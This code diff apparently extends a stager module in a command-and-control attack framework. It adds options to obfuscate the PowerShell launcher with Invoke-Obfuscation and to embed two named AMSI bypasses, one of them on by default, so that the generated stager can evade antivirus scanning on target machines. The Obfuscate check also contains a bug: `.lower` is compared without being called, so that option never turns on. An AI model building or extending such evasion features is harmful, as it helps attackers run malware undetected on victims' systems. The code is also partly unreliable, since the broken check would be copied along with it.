@@ -28,6 +28,26 @@ class Stager(object):
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'Language' : {
                 'Description'   :   'Language of the stager to generate.',
                 'Required'      :   True,
@@ -82,6 +102,10 @@ class Stager(object):
 
 
     def generate(self):
+        # default booleans to false
+        obfuscateScript = False
+        AMSIBypassBool = False
+        AMSIBypass2Bool = False
 
         # extract all of our options
         language = self.options['Language']['Value']
@@ -92,9 +116,21 @@ class Stager(object):
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
+        if self.options['AMSIBypass']['Value'].lower() == "true":
+            AMSIBypassBool = True
+        if self.options['AMSIBypass2']['Value'].lower() == "true":
+            AMSIBypass2Bool = True
+        if self.options['Obfuscate']['Value'].lower == "true":
+            obfuscateScript = True
+        obfuscateCommand = self.options['ObfuscateCommand']['Value']
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True,
+                                                           obfuscate=obfuscateScript,
+                                                           obfuscationCommand=obfuscateCommand, userAgent=userAgent,
+                                                           proxy=proxy, proxyCreds=proxyCreds,
+                                                           stagerRetries=stagerRetries, AMSIBypass=AMSIBypassBool,
+                                                           AMSIBypass2=AMSIBypass2Bool)
         
 
         if launcher == "":
